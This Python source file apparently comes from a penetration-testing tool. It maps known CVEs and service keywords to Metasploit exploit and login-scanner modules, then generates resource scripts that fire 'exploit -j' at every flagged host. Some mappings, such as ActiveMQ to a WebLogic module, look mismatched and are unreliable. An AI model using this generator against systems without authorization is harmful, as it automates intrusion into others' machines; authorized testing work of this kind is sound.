"""
NexShield Metasploit Utilities (msf_utils.py)
Contains the shared Exploit Intelligence Database, MSF mappings, and RC script generator logic.
"""

EXPLOIT_DATABASE = {
    "ms17-010": {
        "module": "exploit/windows/smb/ms17_010_eternalblue",
        "rank": "EXCELLENT",
        "reliability": "HIGH",
        "check": True,
        "desc": "Remote Ring 0 kernel overflow via SMBv1. Highly unstable if target has low RAM."
    },
    "ms08-067": {
        "module": "exploit/windows/smb/ms08_067_netapi",
        "rank": "GREAT",
        "reliability": "HIGH",
        "check": True,
        "desc": "Classic NetAPI overflow. Effective against older systems (XP/2003)."
    },
    "bluekeep": {
        "module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        "rank": "MANUAL",
        "reliability": "MEDIUM",
        "check": True,
        "desc": "RDP Use-After-Free. Requires precise kernel grooming. High risk of BSoD."
    },
    "log4shell": {
        "module": "exploit/multi/http/log4shell_header_injection",
        "rank": "EXCELLENT",
        "reliability": "MAXIMAL",
        "check": True,
        "desc": "JNDI injection via Log4j. Cross-platform. One of the most critical bugs in history."
    },
    "pwnkit": {
        "module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe",
        "rank": "EXCELLENT",
        "reliability": "HIGH",
        "check": False,
        "desc": "Polkit pkexec Local Privilege Escalation. Reliable and silent."
    },
    "vsftpd 2.3.4": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "rank": "EXCELLENT",
        "reliability": "MAXIMAL",
        "check": True,
        "desc": "Backdoor trigger via ':)' smiley in username. Instant root access."
    },
    "proxylogon": {
        "module": "exploit/windows/http/exchange_proxylogon_rce",
        "rank": "EXCELLENT",
        "reliability": "HIGH",
        "check": True,
        "desc": "Exchange Server SSRF + File Write. Leads to full domain compromise."
    },
    "redis": {
        "module": "exploit/linux/redis/redis_replication_cmd_exec",
        "rank": "EXCELLENT",
        "reliability": "HIGH",
        "check": True,
        "desc": "Master/Slave replication takeover. Allows arbitrary command execution."
    }
}

MSF_MAPPINGS = {str(k): str(v["module"]) for k, v in EXPLOIT_DATABASE.items()}
MSF_MAPPINGS.update({
    "tomcat": "exploit/multi/http/tomcat_mgr_upload",
    "smb": "auxiliary/scanner/smb/smb_version",
    "printnightmare": "exploit/windows/dcerpc/cve_2021_34527_printnightmare",
    "vsftpd": "exploit/unix/ftp/vsftpd_234_backdoor",
    "ssh": "auxiliary/scanner/ssh/ssh_login",
    "ftp": "auxiliary/scanner/ftp/ftp_login",
    "vnc": "auxiliary/scanner/vnc/vnc_login",
    "rdp": "auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
    "mysql": "auxiliary/scanner/mysql/mysql_login",
    "postgresql": "auxiliary/scanner/postgres/postgres_login",
    "mongodb": "auxiliary/scanner/mongodb/mongodb_login",
    "elasticsearch": "exploit/multi/elasticsearch/script_mvel_rce",
    "kubernetes": "auxiliary/scanner/kubernetes/kubelet_readonly_exec",
    "weblogic": "exploit/multi/misc/weblogic_deserialize",
    "confluence": "exploit/multi/http/confluence_cve_2022_26134",
    "gitlab": "exploit/multi/http/gitlab_exif_rce",
    "jenkins": "exploit/multi/http/jenkins_script_console",
    "docker": "exploit/linux/local/docker_runc_escape",
    "memcache": "auxiliary/gather/memcached_extractor",
    "spring": "exploit/multi/http/spring_cloud_function_cve_2022_22963",
    "exchange": "exploit/windows/http/exchange_proxylogon_rce",
    "rpcbind": "auxiliary/scanner/portmap/portmap_amp",
    "activemq": "exploit/multi/misc/weblogic_deserialize",
    "grafana": "auxiliary/scanner/http/grafana_plugin_lfi",
    "cve-2021-44228": "exploit/multi/http/log4shell_header_injection",
    "cve-2019-0708": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    "zerologon": "auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
    "dirty pipe": "exploit/linux/local/cve_2022_0847_dirtypipe",
    "polkit": "exploit/linux/local/cve_2021_4034_pwnkit_lpe",
    "macos": "exploit/osx/local/root_dsimport",
    "safari": "exploit/osx/browser/safari_webkit_drop_exec",
    "ios": "exploit/apple_ios/browser/webkit_trident",
    "android": "exploit/android/browser/webview_addjavascriptinterface",
    "strandhogg": "exploit/android/local/strandhogg",
    "cve-2022-22965": "exploit/multi/http/spring4shell_rce"
})

def map_threat_to_module(threat):
    """Map a threat document to a Metasploit module based on keywords."""
    detail = str(threat.get("detail") or "").lower()
    name = str(threat.get("name") or "").lower()
    cve = str(threat.get("cve_id") or "").lower()
    
    for keyword, mod in MSF_MAPPINGS.items():
        if keyword in detail or keyword in name or keyword in cve:
            return mod
    return None

def generate_rc_script(threats, target_host=None):
    """
    Generate Metasploit RC script for a list of threats.
    Returns (rc_string, list_of_modules_added)
    """
    rc_lines = [
        "# NexShield Auto-Generated Metasploit Script",
        f"# Targets: {target_host if target_host else 'All High/Critical Hosts'}",
        "spool msf_nexshield_session.log",
        "setg VERBOSE true",
        ""
    ]
    
    modules_added = set()
    for t in threats:
        host = t.get("host")
        module = map_threat_to_module(t)
        
        if not module:
            module = "auxiliary/scanner/portscan/tcp"
            
        combo_key = f"{host}_{module}"
        if combo_key not in modules_added:
            rc_lines.extend([
                f"# Target: {host} - {t.get('name')}",
                f"use {module}",
                f"set RHOSTS {host}",
                "set LHOST eth0  # Update this if needed",
                "exploit -j",
                ""
            ])
            modules_added.add(combo_key)
            
    return "\n".join(rc_lines), modules_added
